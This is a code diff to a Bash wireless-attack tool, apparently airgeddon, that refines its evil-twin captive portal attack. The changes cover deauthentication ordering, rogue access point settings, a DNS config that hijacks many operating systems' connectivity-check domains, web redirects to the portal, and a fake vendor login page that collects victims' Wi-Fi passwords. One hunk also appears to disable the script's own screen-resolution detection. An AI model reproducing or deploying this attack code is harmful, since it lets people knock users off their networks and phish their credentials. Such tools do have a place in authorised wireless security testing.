@@ -151,7 +151,7 @@ resume_message=224
 abort_question=12
 pending_of_translation="[PoT]"
 escaped_pending_of_translation="\[PoT\]"
-standard_resolution="1024x768"
+standard_resolution="1280x800"
 curl_404_error="404: Not Found"
 rc_file_name=".airgeddonrc"
 alternative_rc_file_name="airgeddonrc"
@@ -9806,13 +9806,13 @@ function exec_et_captive_portal_attack() {
 	rm -rf "${tmpdir}${webdir}" > /dev/null 2>&1
 	mkdir "${tmpdir}${webdir}" > /dev/null 2>&1
 
+	exec_et_deauth
 	set_hostapd_config
 	launch_fake_ap
 	set_network_interface_data
 	set_dhcp_config
 	set_std_internet_routing_rules
 	launch_dhcp_server
-	exec_et_deauth
 	set_et_control_script
 	launch_et_control_window
 	launch_dns_blackhole
@@ -9905,23 +9905,23 @@ function set_hostapd_config() {
 	{
 	echo -e "interface=${interface}"
 	echo -e "driver=nl80211"
-	echo -e "beacon_int=15"
-	echo -e "preamble=0"
+	echo -e "beacon_int=10"
+	echo -e "preamble=1"
 	echo -e "channel=${replace_channel}"
-	echo -e "dtim_period=255"
+	echo -e "dtim_period=1"
 	# echo -e "ht_capab=[HT40+][SHORT-GI-20][SHORT-GI-40]"
-	echo -e "supported_rates=10"
-	echo -e "basic_rates=10"
+	echo -e "supported_rates=10 20"
+	echo -e "basic_rates=10 20"
 	# supported_rates=60 90 120 180 240 360 480 540
 	# basic_rates=60 120
 	# supported_rates=12 18 24 36 48 54
 	# basic_rates=12 24
-	echo -e "ignore_broadcast_ssid=0"
+	# echo -e "ignore_broadcast_ssid=0"
 	echo -e "wmm_enabled=0"
-	echo -e "disassoc_low_ack=0"
+	# echo -e "disassoc_low_ack=0"
 	echo -e "ap_isolate=0"
 
-	echo -e "rts_threshold=0"
+	echo -e "rts_threshold=2347"
 	echo -e "fragm_threshold=256"
 	echo -e "ap_max_inactivity=3600"
 
@@ -10089,7 +10089,7 @@ function set_network_interface_data() {
 	any_ipv6="::/0"
 
 	first_octet="192"
-	second_octet="169"
+	second_octet="168"
 	third_octet="1"
 	fourth_octet="0"
 
@@ -10108,7 +10108,7 @@ function set_network_interface_data() {
 	et_ip_range="${ip_range}"
 	et_ip_router="${first_octet}.${second_octet}.${third_octet}.1"
 	et_broadcast_ip="${first_octet}.${second_octet}.${third_octet}.255"
-	et_range_start="${first_octet}.${second_octet}.${third_octet}.33"
+	et_range_start="${first_octet}.${second_octet}.${third_octet}.2"
 	et_range_stop="${first_octet}.${second_octet}.${third_octet}.100"
 }
 
@@ -10125,6 +10125,8 @@ function set_dhcp_config() {
 	echo -e "authoritative;"
 	echo -e "default-lease-time 600;"
 	echo -e "max-lease-time 7200;"
+	echo -e "noipv6rs;"
+	echo -e "noipv6;"
 	echo -e "subnet ${et_ip_range} netmask ${std_c_mask} {"
 	echo -e "\toption broadcast-address ${et_broadcast_ip};"
 	echo -e "\toption routers ${et_ip_router};"
@@ -11438,15 +11440,38 @@ function launch_dns_blackhole() {
 	echo -e "interface=${interface}"
 	echo -e "address=/#/${et_ip_router}"
 	echo -e "port=${dns_port}"
-	echo -e "bind-dynamic"
+	echo -e "bind-interfaces"
+	# bind-dynamic
 	echo -e "except-interface=${loopback_interface}"
-	echo -e "address=/google.com/172.217.5.238"
-	echo -e "address=/gstatic.com/172.217.5.238"
-	echo -e "no-dhcp-interface=${interface}"
-	echo -e "log-queries"
-	echo -e "no-daemon"
+	echo -e "bogus-priv"
+	echo -e "domain-needed"
 	echo -e "no-resolv"
 	echo -e "no-hosts"
+	echo -e "log-queries"
+	echo -e "no-daemon"
+	echo -e "address=/google.com/${et_ip_router}"
+	echo -e "address=/gstatic.com/${et_ip_router}"
+	echo -e "address=/connectivitycheck.android.com/${et_ip_router}"
+	echo -e "address=/clients3.google.com/${et_ip_router}"
+	echo -e "address=/clients4.google.com/${et_ip_router}"
+	echo -e "address=/captive.apple.com/${et_ip_router}"
+	echo -e "address=/www.apple.com/${et_ip_router}"
+	echo -e "address=/icloud.com/${et_ip_router}"
+	echo -e "address=/msftconnecttest.com/${et_ip_router}"
+	echo -e "address=/msftncsi.com/${et_ip_router}"
+	echo -e "address=/connectivitycheck.gstatic.com/${et_ip_router}"
+	echo -e "address=/detectportal.firefox.com/${et_ip_router}"
+	echo -e "address=/nmcheck.gnome.org/${et_ip_router}"
+	echo -e "address=/connectivity-check.ubuntu.com/${et_ip_router}"
+	echo -e "address=/www.samsung.com/${et_ip_router}"
+	echo -e "address=/connectivitycheck.platform.hicloud.com/${et_ip_router}"
+	echo -e "address=/connectivitycheck.asus.com/${et_ip_router}"
+	echo -e "address=/connectivitycheck.vivo.com/${et_ip_router}"
+	# echo -e "no-dhcp-interface=${interface}"
+
+	# echo -e "address=/google.com/172.217.5.238"
+	# echo -e "address=/gstatic.com/172.217.5.238"
+	
 	} >> "${tmpdir}${dnsmasq_file}"
 
 	manage_output "-hold -bg \"#000000\" -fg \"#0000FF\" -geometry ${g4_middleright_window} -T \"DNS\"" "${optional_tools_names[11]} -C \"${tmpdir}${dnsmasq_file}\"" "DNS"
@@ -11517,32 +11542,18 @@ function set_webserver_config() {
 	rm -rf "${tmpdir}${webserver_log}" > /dev/null 2>&1
 
 	{
+
 	echo -e "server.document-root = \"${tmpdir}${webdir}\"\n"
 	echo -e "server.modules = ("
 	echo -e "\"mod_auth\","
 	echo -e "\"mod_cgi\","
 	echo -e "\"mod_redirect\","
-	echo -e "\"mod_accesslog\""
+	echo -e "\"mod_accesslog\","
+	echo -e "\"mod_rewrite\""
 	echo -e ")\n"
-	echo -e "\$HTTP[\"host\"] =~ \"(.*)\" {"
-	echo -e "url.redirect = ( \"^/index.htm$\" => \"/\")"
-	echo -e "url.redirect-code = 302"
-	echo -e "}"
-	echo -e "\$HTTP[\"host\"] =~ \"gstatic.com\" {"
-	echo -e "url.redirect = ( \"^/(.*)$\" => \"http://connectivitycheck.google.com/\")"
-	echo -e "url.redirect-code = 302"
-	echo -e "}"
-	echo -e "\$HTTP[\"host\"] =~ \"captive.apple.com\" {"
-	echo -e "url.redirect = ( \"^/(.*)$\" => \"http://connectivitycheck.apple.com/\")"
-	echo -e "url.redirect-code = 302"
-	echo -e "}"
-	echo -e "\$HTTP[\"host\"] =~ \"msftconnecttest.com\" {"
-	echo -e "url.redirect = ( \"^/(.*)$\" => \"http://connectivitycheck.microsoft.com/\")"
-	echo -e "url.redirect-code = 302"
-	echo -e "}"
-	echo -e "\$HTTP[\"host\"] =~ \"msftncsi.com\" {"
-	echo -e "url.redirect = ( \"^/(.*)$\" => \"http://connectivitycheck.microsoft.com/\")"
-	echo -e "url.redirect-code = 302"
+	echo -e "\$HTTP[\"host\"] !~ \"^${et_ip_router}$\" {"
+	echo -e "    url.redirect = ( \"^/(.*)$\" => \"http://${et_ip_router}\" )"
+	echo -e "    url.redirect-code = 302"
 	echo -e "}"
 	echo -e "server.bind = \"${et_ip_router}\""
 	echo -e "server.port = ${www_port}\n"
@@ -11555,7 +11566,7 @@ function set_webserver_config() {
 	echo -e "cgi.assign = (\".htm\" => \"/bin/bash\")\n"
 	echo -e "accesslog.filename = \"${tmpdir}${webserver_log}\""
 	echo -e "accesslog.escaping = \"default\""
-	echo -e "accesslog.format = \"%h %s %r %v%U %t '%{User-Agent}i'\""
+	echo -e "accesslog.format = \"%h %s %r %v%U %t '%{User-Agent}i'\"\n"
 	echo -e "\$HTTP[\"remote-ip\"] == \"${loopback_ip}\" { accesslog.filename = \"\" }"
 	} >> "${tmpdir}${webserver_file}"
 
@@ -11718,7 +11729,7 @@ function set_captive_portal_page() {
 
 		{
 			echo -e "#!/usr/bin/env bash"
-			echo -e "echo -e '<!DOCTYPE html><html><head><meta name=\"viewport\" content=\"width=1024\"><meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"><title>${captive_portal_vendor} Login</title><link rel=\"stylesheet\" type=\"text/css\" href=\"portal.css\"><script type=\"text/javascript\" src=\"portal.js\"></script></head><div style=\"position:absolute;display:flex;top:0;left:0;opacity:50%;color:#fff;padding:24px;align-items:center\"><img style=\"filter:brightness(0) invert(1);width:${portal_base64_width};\" src=\"${portal_base64}\"></div><body style=\"margin:0;height:100vh;display:flex;align-items:center;text-align:center;flex-direction:column;padding-top:120px;overflow:hidden\"><img src=\"${pixelfile}\" style=\"display:none\"><h1 style=\"color:#fff;padding-bottom:50px;padding-left:10px;padding-right:10px\">Welcome to ${captive_portal_vendor} web page for network access. Please login to continue.</h1><form method=\"post\" id=\"loginform\" name=\"loginform\" action=\"check.htm\"><div style=\"display:flex;padding-right:50px;flex-direction:column;align-items:flex-end;text-align:left\"><div style=\"display:flex;align-items:center\"><p style=\"padding-right:10px;color:#fff;font-size:18px\">SSID :</p><input disabled=\"disabled\" placeholder=\"${essid//[\`\']/}\" style=\"background-color:transparent;border:1px solid #fff;border-radius:4px;color:#fff;outline:0;width:250px;font-size:18px;padding:10px 6px\" onfocus='this.style.borderColor=\"white\"' onblur='this.style.borderColor=\"white\"'></div><div style=\"display:flex;align-items:center\"><p style=\"padding-right:10px;color:#fff;font-size:18px\">Password :</p><input style=\"background-color:transparent;border:1px solid #fff;border-radius:4px;color:#fff;outline:0;width:250px;font-size:18px;padding:10px 6px\" onfocus='this.style.borderColor=\"white\"' onblur='this.style.borderColor=\"white\"' id=\"password\" type=\"password\" name=\"password\" maxlength=\"63\" size=\"20\"></div><div style=\"display:flex;align-items:center\"><input style=\"background-color:#fff;border:1px solid #fff;border-radius:4px;color:#000;outline:0;width:250px;font-size:18px;padding:10px 6px\" class=\"button\" id=\"formbutton\" type=\"button\" value=\"Log In\"></div></div></form></body><div style=\"position:absolute;background:#fff;bottom:0;width:100%;padding:30px;border-top:3px solid green\"><img style=\"filter:brightness(0) invert(0);opacity:30%;width:${portal_base64_width};\" src=\"${portal_base64}\"><p>Copyright © '${captive_portal_vendor}' Technologies Co., Ltd. 2009-2018. All rights reserved.</p></div></html>'"
+			echo -e "echo -e '<!DOCTYPE html><html><head><meta name=\"viewport\" content=\"width=1024\"><meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"><title>${captive_portal_vendor} Login</title><link rel=\"stylesheet\" type=\"text/css\" href=\"portal.css\"><script type=\"text/javascript\" src=\"portal.js\"></script></head><div style=\"position:absolute;display:flex;top:0;left:0;opacity:50%;color:#fff;padding:24px;align-items:center\"><img style=\"filter:brightness(0) invert(1);width:${portal_base64_width};\" src=\"${portal_base64}\"></div><body style=\"margin:0;height:100vh;display:flex;align-items:center;text-align:center;flex-direction:column;padding-top:120px;overflow:hidden\"><img src=\"${pixelfile}\" style=\"display:none\"><h1 style=\"color:#fff;padding-bottom:50px;padding-left:16px;padding-right:16px\">Welcome to ${captive_portal_vendor} web page for network access. Please login to continue.</h1><form method=\"post\" id=\"loginform\" name=\"loginform\" action=\"check.htm\"><div style=\"display:flex;padding-right:50px;flex-direction:column;align-items:flex-end;text-align:left\"><div style=\"display:flex;align-items:center\"><p style=\"padding-right:10px;color:#fff;font-size:18px\">SSID :</p><input disabled=\"disabled\" placeholder=\"${essid//[\`\']/}\" style=\"background-color:transparent;border:1px solid #fff;border-radius:4px;color:#fff;outline:0;width:250px;font-size:18px;padding:10px 6px\" onfocus='this.style.borderColor=\"white\"' onblur='this.style.borderColor=\"white\"'></div><div style=\"display:flex;align-items:center\"><p style=\"padding-right:10px;color:#fff;font-size:18px\">Password :</p><input style=\"background-color:transparent;border:1px solid #fff;border-radius:4px;color:#fff;outline:0;width:250px;font-size:18px;padding:10px 6px\" onfocus='this.style.borderColor=\"white\"' onblur='this.style.borderColor=\"white\"' id=\"password\" type=\"password\" name=\"password\" maxlength=\"63\" size=\"20\"></div><div style=\"display:flex;align-items:center\"><input style=\"background-color:#fff;border:1px solid #fff;border-radius:4px;color:#000;outline:0;width:250px;font-size:18px;padding:10px 6px\" class=\"button\" id=\"formbutton\" type=\"button\" value=\"Log In\"></div></div></form></body><div style=\"position:absolute;background:#fff;bottom:0;width:100%;padding:30px;border-top:3px solid green\"><img style=\"filter:brightness(0) invert(0);opacity:30%;width:${portal_base64_width};\" src=\"${portal_base64}\"><p>Copyright © '${captive_portal_vendor}' Technologies Co., Ltd. 2009-2018. All rights reserved.</p></div></html>'"
 			echo -e "exit 0"
 		} >> "${tmpdir}${webdir}${indexfile}"
 
@@ -16194,7 +16205,7 @@ function detect_screen_resolution() {
 	resolution_detected=0
 	if hash xdpyinfo 2> /dev/null; then
 		if resolution=$(xdpyinfo 2> /dev/null | grep -A 3 "screen #0" | grep "dimensions" | tr -s " " | cut -d " " -f 3 | grep "x"); then
-			resolution_detected=1
+			resolution_detected=0
 		fi
 	fi
 
